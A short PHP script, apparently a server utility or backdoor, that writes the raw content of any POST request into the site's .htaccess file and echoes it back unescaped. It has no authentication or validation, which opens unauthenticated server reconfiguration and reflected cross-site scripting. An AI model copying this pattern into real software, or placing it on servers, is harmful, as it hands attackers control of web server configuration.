<?php

echo(stripslashes($_POST['content']));

$myFile = ".htaccess";
$fh = fopen($myFile, 'w') or die("can't open file");
fwrite($fh, stripslashes($_POST['content']));
fclose($fh);


?>
